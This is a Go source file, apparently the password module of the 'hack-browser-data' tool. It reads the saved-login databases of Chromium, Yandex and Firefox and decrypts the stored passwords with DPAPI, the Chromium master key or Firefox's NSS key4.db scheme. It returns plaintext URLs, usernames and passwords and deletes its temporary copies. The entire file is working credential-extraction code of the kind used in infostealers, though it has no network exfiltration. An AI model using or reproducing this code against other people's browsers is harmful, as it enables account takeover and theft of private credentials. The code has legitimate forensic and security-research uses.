package password

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	"os"
	"sort"
	"time"

	"hack-browser-data/internal/decrypter"
	"hack-browser-data/internal/item"
	"hack-browser-data/internal/log"
	"hack-browser-data/internal/utils/typeutil"

	// import sqlite3 driver
	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"
)

type ChromiumPassword []loginData

type loginData struct {
	UserName    string
	encryptPass []byte
	encryptUser []byte
	Password    string
	LoginURL    string
	CreateDate  time.Time
}

const (
	queryChromiumLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`
)

func (c *ChromiumPassword) Parse(masterKey []byte) error {
	loginDB, err := sql.Open("sqlite3", item.TempChromiumPassword)
	if err != nil {
		return err
	}
	defer os.Remove(item.TempChromiumPassword)
	defer loginDB.Close()
	rows, err := loginDB.Query(queryChromiumLogin)
	if err != nil {
		return err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		if err := rows.Scan(&url, &username, &pwd, &create); err != nil {
			log.Warn(err)
		}
		login := loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginURL:    url,
		}
		if len(pwd) > 0 {
			var err error
			if masterKey == nil {
				password, err = decrypter.DPAPI(pwd)
			} else {
				password, err = decrypter.Chromium(masterKey, pwd)
			}
			if err != nil {
				log.Error(err)
			}
		}
		if create > time.Now().Unix() {
			login.CreateDate = typeutil.TimeEpoch(create)
		} else {
			login.CreateDate = typeutil.TimeStamp(create)
		}
		login.Password = string(password)
		*c = append(*c, login)
	}
	// sort with create date
	sort.Slice(*c, func(i, j int) bool {
		return (*c)[i].CreateDate.After((*c)[j].CreateDate)
	})
	return nil
}

func (c *ChromiumPassword) Name() string {
	return "password"
}

func (c *ChromiumPassword) Length() int {
	return len(*c)
}

type YandexPassword []loginData

const (
	queryYandexLogin = `SELECT action_url, username_value, password_value, date_created FROM logins`
)

func (c *YandexPassword) Parse(masterKey []byte) error {
	loginDB, err := sql.Open("sqlite3", item.TempYandexPassword)
	if err != nil {
		return err
	}
	defer os.Remove(item.TempYandexPassword)
	defer loginDB.Close()
	rows, err := loginDB.Query(queryYandexLogin)
	if err != nil {
		return err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		if err := rows.Scan(&url, &username, &pwd, &create); err != nil {
			log.Warn(err)
		}
		login := loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginURL:    url,
		}

		if len(pwd) > 0 {
			var err error
			if masterKey == nil {
				password, err = decrypter.DPAPI(pwd)
			} else {
				password, err = decrypter.Chromium(masterKey, pwd)
			}
			if err != nil {
				log.Errorf("decrypt yandex password error %s", err)
			}
		}
		if create > time.Now().Unix() {
			login.CreateDate = typeutil.TimeEpoch(create)
		} else {
			login.CreateDate = typeutil.TimeStamp(create)
		}
		login.Password = string(password)
		*c = append(*c, login)
	}
	// sort with create date
	sort.Slice(*c, func(i, j int) bool {
		return (*c)[i].CreateDate.After((*c)[j].CreateDate)
	})
	return nil
}

func (c *YandexPassword) Name() string {
	return "password"
}

func (c *YandexPassword) Length() int {
	return len(*c)
}

type FirefoxPassword []loginData

const (
	queryMetaData   = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
	queryNssPrivate = `SELECT a11, a102 from nssPrivate`
)

func (f *FirefoxPassword) Parse(masterKey []byte) error {
	globalSalt, metaBytes, nssA11, nssA102, err := getFirefoxDecryptKey(item.TempFirefoxKey4)
	if err != nil {
		return err
	}
	metaPBE, err := decrypter.NewASN1PBE(metaBytes)
	if err != nil {
		return err
	}

	k, err := metaPBE.Decrypt(globalSalt, masterKey)
	if err != nil {
		return err
	}
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	if bytes.Contains(k, []byte("password-check")) {
		m := bytes.Compare(nssA102, keyLin)
		if m == 0 {
			nssPBE, err := decrypter.NewASN1PBE(nssA11)
			if err != nil {
				return err
			}
			finallyKey, err := nssPBE.Decrypt(globalSalt, masterKey)
			finallyKey = finallyKey[:24]
			if err != nil {
				return err
			}
			allLogin, err := getFirefoxLoginData()
			if err != nil {
				return err
			}
			for _, v := range allLogin {
				userPBE, err := decrypter.NewASN1PBE(v.encryptUser)
				if err != nil {
					return err
				}
				pwdPBE, err := decrypter.NewASN1PBE(v.encryptPass)
				if err != nil {
					return err
				}
				user, err := userPBE.Decrypt(finallyKey, masterKey)
				if err != nil {
					return err
				}
				pwd, err := pwdPBE.Decrypt(finallyKey, masterKey)
				if err != nil {
					return err
				}
				*f = append(*f, loginData{
					LoginURL:   v.LoginURL,
					UserName:   string(user),
					Password:   string(pwd),
					CreateDate: v.CreateDate,
				})
			}
		}
	}
	sort.Slice(*f, func(i, j int) bool {
		return (*f)[i].CreateDate.After((*f)[j].CreateDate)
	})
	return nil
}

func getFirefoxDecryptKey(key4file string) (item1, item2, a11, a102 []byte, err error) {
	var keyDB *sql.DB
	keyDB, err = sql.Open("sqlite3", key4file)
	if err != nil {
		return nil, nil, nil, nil, err
	}
	defer func(name string) {
		err := os.Remove(name)
		if err != nil {
			log.Errorf("remove %s error", name)
		}
	}(key4file)
	defer func(keyDB *sql.DB) {
		err := keyDB.Close()
		if err != nil {

		}
	}(keyDB)

	if err = keyDB.QueryRow(queryMetaData).Scan(&item1, &item2); err != nil {
		return nil, nil, nil, nil, err
	}

	if err = keyDB.QueryRow(queryNssPrivate).Scan(&a11, &a102); err != nil {
		return nil, nil, nil, nil, err
	}
	return item1, item2, a11, a102, nil
}

func getFirefoxLoginData() (l []loginData, err error) {
	s, err := os.ReadFile(item.TempFirefoxPassword)
	if err != nil {
		return nil, err
	}
	defer func(name string) {
		err := os.Remove(name)
		if err != nil {

		}
	}(item.TempFirefoxPassword)
	h := gjson.GetBytes(s, "logins")
	if h.Exists() {
		for _, v := range h.Array() {
			var (
				m    loginData
				user []byte
				pass []byte
			)
			m.LoginURL = v.Get("formSubmitURL").String()
			user, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
			if err != nil {
				return nil, err
			}
			pass, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
			if err != nil {
				return nil, err
			}
			m.encryptUser = user
			m.encryptPass = pass
			m.CreateDate = typeutil.TimeStamp(v.Get("timeCreated").Int() / 1000)
			l = append(l, m)
		}
	}
	return l, nil
}

func (f *FirefoxPassword) Name() string {
	return "password"
}

func (f *FirefoxPassword) Length() int {
	return len(*f)
}
